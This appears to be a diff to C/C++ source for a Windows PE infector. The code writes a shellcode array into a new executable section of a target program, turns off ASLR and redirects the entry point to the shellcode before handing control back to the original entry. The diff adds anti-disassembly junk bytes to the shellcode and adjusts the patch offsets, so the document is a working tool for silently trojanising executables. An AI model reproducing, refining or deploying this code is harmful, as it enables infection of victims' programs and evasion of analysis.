@@ -1,7 +1,9 @@
 #include <Windows.h>
 wchar_t path[MAX_PATH] = L"test.exe";
 
-unsigned char buf[] = { 0xe8,0x0,0x0,0x0,0x0,0x58,0x55,0x89,0xe5,0x89,0xc3,0x5,0x80,0x7,0x0,0x0,
+unsigned char buf[] = { 
+0x8D,0x05,0xDD,0x1C,0x40,0x00,0x83,0xC0,0x0E,0xEB,0x05,0xEB,0xF3,0xDB,0x30,0x57,0xFF,0xE0,0xE9,0x21,
+0xe8,0x0,0x0,0x0,0x0,0x58,0x55,0x89,0xe5,0x89,0xc3,0x5,0x80,0x7,0x0,0x0,
 0x81,0xc3,0x80,0x1d,0x1,0x0,0x68,0x0,0x0,0x0,0x0,0x68,0x5,0x0,0x0,0x0,
 0x53,0x68,0x40,0x69,0x1c,0xf3,0x50,0xe8,0x2,0x0,0x0,0x0,0xc9,0xc3,0x83,0xec,
 0x6c,0x53,0x55,0x56,0x57,0xb9,0x4c,0x77,0x26,0x7,0xe8,0x6e,0x6,0x0,0x0,0x8b,
@@ -4580,13 +4582,12 @@ DWORD Aligment(DWORD dwSize, DWORD dwAlig)
 
 void main()
 {
-	MessageBoxA(NULL, "SUCCESS", "成功", MB_OK);
 	char currentpath[MAX_PATH] = { 0 };
 	GetModuleFileNameA(NULL, currentpath, MAX_PATH);
 	int totalSize = strlen(currentpath) + sizeof(buf);
 	char *shellcode = new char[totalSize];
 	memcpy(shellcode, buf, sizeof(buf));
-	memcpy(shellcode + 0x11d85, currentpath, strlen(currentpath));
+	memcpy(shellcode + 0x11D99, currentpath, strlen(currentpath));
 	HANDLE hFile = CreateFile(path, FILE_GENERIC_READ | FILE_GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (INVALID_HANDLE_VALUE == hFile)
 	{
@@ -4628,12 +4629,14 @@ void main()
 	pLastSectionHeader->Characteristics = 0xE0000060;
 	pOptionalHeader->SizeOfImage = Aligment(pLastSectionHeader->VirtualAddress + pLastSectionHeader->SizeOfRawData, dwMemAlig);
 	//去掉随机基址
-	pOptionalHeader->DllCharacteristics &= (~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) ;
+	pOptionalHeader->DllCharacteristics &= (~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE);
 	//修改入口点
 	DWORD oldOep = pOptionalHeader->AddressOfEntryPoint;
 	pOptionalHeader->AddressOfEntryPoint = pLastSectionHeader->VirtualAddress;
+	//填补花指令
+	*(DWORD*)&shellcode[2] = pOptionalHeader->AddressOfEntryPoint + pOptionalHeader->ImageBase + 6;
 	//填入入口点
-	*(DWORD*)&shellcode[0xBA0] = oldOep+ pOptionalHeader->ImageBase;
+	*(DWORD*)&shellcode[0xBB4] = oldOep + pOptionalHeader->ImageBase;
 	//修改文件
 	int newFileSize = pLastSectionHeader->PointerToRawData + pLastSectionHeader->SizeOfRawData;
 	char  *pNewFile = new char[newFileSize];
